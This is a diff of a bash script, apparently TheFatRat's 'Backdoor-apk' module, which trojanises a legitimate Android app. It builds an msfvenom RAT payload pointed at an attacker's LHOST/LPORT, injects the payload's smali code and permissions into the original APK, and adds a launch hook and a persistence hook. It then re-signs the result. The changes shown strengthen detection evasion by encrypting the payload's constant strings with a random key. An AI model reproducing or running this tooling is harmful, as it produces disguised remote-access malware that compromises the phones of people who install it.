@@ -33,6 +33,7 @@ APKTOOL=`sed -n 12p $file`
 PROGUARD=`sed -n 9p $file`
 DX=`sed -n 10p $file`
 ZIPALIGN=`sed -n 8p $file`
+ASO=tools/android-string-obfuscator/lib/aso
 proconfig=config/android.pro
 else
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
@@ -53,15 +54,10 @@ exit 1
 fi
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
 
-VERSION="0.2.1"
-
-
-# file paths and misc
-location=$1
+VERSION="0.2.2"
 LOG_FILE=$MY_PATH/logs/apk.log
 TIME_OF_RUN=`date`
-# for functions
-FUNC_RESULT=""
+
 # functions
 function find_smali_file {
   # $1 = smali_file_to_hook
@@ -126,19 +122,19 @@ function hook_smali_file {
 
 function verify_orig_apk {
   if [ -z $MY_PATH/temp/$ORIG_APK_FILE ]; then
-    echo -e $red "[!] No original APK file specified"
+    echo "[!] No original APK file specified"
     exit 1
   fi
 
   if [ ! -f $MY_PATH/temp/$ORIG_APK_FILE ]; then
-    echo -e $red "[!] Original APK file specified does not exist"
+    echo "[!] Original APK file specified does not exist"
     exit 1
   fi
 
   $UNZIP -l $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc != 0 ]; then
-    echo -e $red "[!] Original APK file specified is not valid"
+    echo "[!] Original APK file specified is not valid"
     exit $rc
   fi
 }
@@ -147,14 +143,13 @@ function consult_which {
   which $1 >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc != 0 ]; then
-    echo -e $red "[!] Check your environment and configuration. Couldn't find: $1"
+    echo "[!] Check your environment and configuration. Couldn't find: $1"
     exit $rc
   fi
 }
 
-
 function init {
-  echo "Running createapk ( fatrat 1.9 Edition ) at $TIME_OF_RUN" >$LOG_FILE 2>&1
+  echo "Running Backdoor-apk 2.2.2 ( fatrat 1.9 Edition ) at $TIME_OF_RUN" >$LOG_FILE 2>&1
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -162,6 +157,7 @@ function init {
   consult_which $JARSIGNER
   consult_which $APKTOOL
   consult_which $PROGUARD
+  consult_which $ASO
   consult_which $DX
   consult_which $ZIPALIGN
   verify_orig_apk
@@ -170,31 +166,32 @@ function init {
 # kick things off
 init
 
-# generate Metasploit resource script
-# credit to John Troony for the suggestion
-echo ""
 echo -e $green "[*] Creating RAT Apk File "
-$MSFVENOM -f raw -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
+$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
+rc=$?
+echo "done."
 if [ $rc != 0 ] || [ ! -f $MY_PATH/temp/$RAT_APK_FILE ]; then
   echo -e $red "[!] Failed to generate RAT APK file"
   exit 1
 fi
 
-echo -e $green  "[*] Decompiling RAT APK file..."
+echo -e $green "[*] Decompiling RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to decompile RAT APK file"
+  cleanup
   exit $rc
 fi
 
 echo -e $green "[*] Decompiling original APK file..."
-$APKTOOL d -f -o $MY_PATH/temp/original $MY_PATH/temp/$ORIG_APK_FILE >>$LOG_FILE 2>&1
+$APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to decompile original APK file"
+  cleanup
   exit $rc
 fi
 
@@ -207,7 +204,7 @@ for i in `seq 1 4`; do
   placeholder="$placeholder$hex"
 done
 echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1
-tmp_perms_file=$MY_PATH/temp/perms.tmp
+tmp_perms_file=$MY_PATH/perms.tmp
 original_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml
 payload_manifest_file=$MY_PATH/temp/payload/AndroidManifest.xml
 merged_manifest_file=$MY_PATH/temp/original/AndroidManifest.xml.merged
@@ -221,7 +218,7 @@ mv $merged_manifest_file.uniq $merged_manifest_file
 sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
 diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
 mv $merged_manifest_file $original_manifest_file
-echo -e $yellow "done."
+echo "done."
 
 # cleanup payload directory after merging app permissions
 rm -rf $MY_PATH/temp/payload >>$LOG_FILE 2>&1
@@ -235,7 +232,7 @@ mv $MY_PATH/temp/$RAT_APK_FILE $MY_PATH/temp/bin/classes >>$LOG_FILE 2>&1
 $DEX2JAR $MY_PATH/temp/bin/classes/$RAT_APK_FILE -o $MY_PATH/temp/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
-  echo -e $yellow "done."
+  echo "done."
   echo -e $red "[!] Failed to run dex2jar on RAT APK file"
   exit $rc
 fi
@@ -243,34 +240,34 @@ fi
 cp -R $MY_PATH/java/classes/* $MY_PATH/temp/libs/ >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
-  echo -e $yellow "done."
+  echo "done."
   echo -e $red "[!] Failed to inject Java classes"
   exit $rc
 fi
-cd $MY_PATH/temp/bin/classes/
+cd $MY_PATH/temp/bin/classes 
 jar xvf $MY_PATH/temp/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 cd $MY_PATH
 rm $MY_PATH/temp/bin/classes/*.apk $MY_PATH/temp/bin/classes/*.jar >>$LOG_FILE 2>&1
 $PROGUARD @$proconfig >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
-  echo -e $yellow "done."
+  echo "done."
   echo -e $red "[!] Failed to run proguard with specified configuration"
   exit $rc
 fi
 $DX --dex --output="$MY_PATH/temp/$RAT_APK_FILE" $MY_PATH/temp/bin/classes-processed.jar >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
-  echo -e $yellow "done."
+  echo "done."
   echo -e $red "[!] Failed to run dx on proguard processed jar file"
   exit $rc
 fi
-echo -e $yellow "done."
+echo "done."
 
 echo -e $green "[*] Decompiling obfuscated RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/temp/payload $MY_PATH/temp/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to decompile RAT APK file"
   exit $rc
@@ -292,7 +289,7 @@ echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1
 echo -e $green "[*] Creating new directories in original project for RAT smali files..."
 mkdir -v -p $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to create new directories for RAT smali files"
   exit $rc
@@ -309,7 +306,7 @@ if [ $rc == 0 ]; then
   cp -v $MY_PATH/temp/payload/smali/net/dirtybox/util/*.smali $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
   rc=$?
 fi
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to copy RAT smali files"
   exit $rc
@@ -326,7 +323,7 @@ if [ $rc == 0 ]; then
   sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
   rc=$?
 fi
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to fix RAT smali files"
   exit $rc
@@ -335,16 +332,41 @@ fi
 echo -e $green "[*] Obfuscating const-string values in RAT smali files..."
 cat >$MY_PATH/temp/obfuscate.method <<EOL
 
-    invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
+    invoke-static {###REG###}, L###CLASS###;->b(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object ###REG###
 EOL
 stringobfuscator_class=`ls $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/temp/original/smali/::g" |sed "s:.smali::g"`
 echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
+so_class_suffix=`echo $stringobfuscator_class |awk -F "/" '{ printf "%s.smali", $4 }'`
+echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
+so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
+so_key=$so_default_key
+which openssl >>$LOG_FILE 2>&1
+rc=$?
+if [ $rc == 0 ]; then
+  so_key="$(openssl rand -base64 16)"
+  rc=$?
+fi
+if [ $rc == 0 ]; then
+  file="$MY_PATH/temp/original/smali/$stringobfuscator_class.smali"
+  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
+  rc=$?
+  if [ $rc == 0 ]; then
+    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
+  else
+    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
+    so_key=$so_default_key
+  fi
+else
+  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
+  so_key=$so_default_key 
+fi
+echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
 sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
-  grep "const-string" $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
+  grep "const-string" --exclude="$so_class_suffix" $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |while read -r line; do
     file=`echo $line |awk -F ": " '{ print $1 }'`
     echo "File: $file" >>$LOG_FILE 2>&1
     target=`echo $line |awk -F ", " '{ print $2 }'`
@@ -352,36 +374,39 @@ if [ $rc == 0 ]; then
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
-    trlist_max_line=`wc -l $MY_PATH/lists/trlist.txt |awk '{ print $1 }'`
-    trlist_rand_line=`shuf -i 1-${trlist_max_line} -n 1`
-    trlist_line=`sed "${trlist_rand_line}q;d" $MY_PATH/lists/trlist.txt`
-    shift_count=$(awk '{ print $1 }' <<< $trlist_line)
-    shift_tr_value=$(awk '{ print $2 }' <<< $trlist_line)
-    echo "Shift count: $shift_count" >>$LOG_FILE 2>&1
-    echo "Shift tr value: $shift_tr_value" >>$LOG_FILE 2>&1
-    replacement=`echo $target |tr '[A-Za-z]' $shift_tr_value |sed 's:^":"'"$shift_count"':g'`
+    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
+    replacement=`$ASO e "$stripped_target" k "$so_key"`
+    rc=$?
+    if [ $rc != 0 ]; then
+      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
+      touch $MY_PATH/temp/obfuscate.error
+      break
+    fi
+    replacement="\"$(echo $replacement)\""
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to replace target value" >>$LOG_FILE 2>&1
       touch $MY_PATH/temp/obfuscate.error
       break
     fi
     sed -i '\|'"$replacement"'|r '"$MY_PATH/temp"'/obfuscate.method' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject unobfuscate method call" >>$LOG_FILE 2>&1
       touch $MY_PATH/temp/obfuscate.error
       break
     fi
     sed -i 's/###REG###/'"$reg"'/' $file >>$LOG_FILE 2>&1
     rc=$?
     if [ $rc != 0 ]; then
+      echo "Failed to inject register value" >>$LOG_FILE 2>&1
       touch $MY_PATH/temp/obfuscate.error
       break
     fi
   done
   if [ ! -f $MY_PATH/temp/obfuscate.error ]; then
-    #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
     class="$stringobfuscator_class"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/temp/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
@@ -390,7 +415,7 @@ if [ $rc == 0 ]; then
     rc=1
   fi
 fi
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to obfuscate const-string values in RAT smali files"
   exit $rc
@@ -425,11 +450,11 @@ smali_file_to_hook=$MY_PATH/temp/original/smali/$android_class.smali
 find_smali_file $smali_file_to_hook $android_class
 rc=$?
 if [ $rc != 0 ]; then
-  echo -e $yellow "done."
+  echo "done."
   echo -e $red "[!] Failed to locate smali file to hook"
   exit $rc
 else
-  echo -e $yellow "done."
+  echo "done."
   smali_file_to_hook=$FUNC_RESULT
   echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
 fi
@@ -437,10 +462,10 @@ fi
 echo -e $green "[*] Adding hook in original smali file..."
 hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to add hook"
-    exit $rc
+  exit $rc
 fi
 
 echo -e $green "[*] Adding persistence hook in original project..."
@@ -462,7 +487,7 @@ if [ $rc == 0 ]; then
     rc=$?
   fi
 fi
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to add persistence hook"
   exit $rc
@@ -471,7 +496,7 @@ fi
 echo -e $green "[*] Recompiling original project with backdoor..."
 $APKTOOL b $MY_PATH/temp/original >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to recompile original project with backdoor"
   exit $rc
@@ -503,7 +528,7 @@ start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
 validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
 echo "Value of validity: $validity" >>$LOG_FILE 2>&1
 
-echo -e $green "[*] Generating RSA key for signing..."
+echo -n "[*] Generating RSA key for signing..."
 $KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc != 0 ]; then
@@ -511,7 +536,7 @@ if [ $rc != 0 ]; then
   $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
   rc=$?
 fi
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to generate RSA key"
   exit $rc
@@ -520,7 +545,7 @@ fi
 echo -e $green "[*] Signing recompiled APK..."
 $JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to sign recompiled APK"
   exit $rc
@@ -529,7 +554,7 @@ fi
 echo -e $green "[*] Verifying signed artifacts..."
 $JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to verify signed artifacts"
   exit $rc
@@ -540,14 +565,13 @@ mv $compiled_apk $unaligned_apk
 echo -e $green "[*] Aligning recompiled APK..."
 $ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
-echo -e $yellow "done."
+echo "done."
 if [ $rc != 0 ]; then
   echo -e $red "[!] Failed to align recompiled APK"
   exit $rc
 fi
 
 rm $unaligned_apk
-
 #Checking finished apk file
 fiapk=$MY_PATH/temp/original/dist/app.apk
 if [ -f "$fiapk" ]
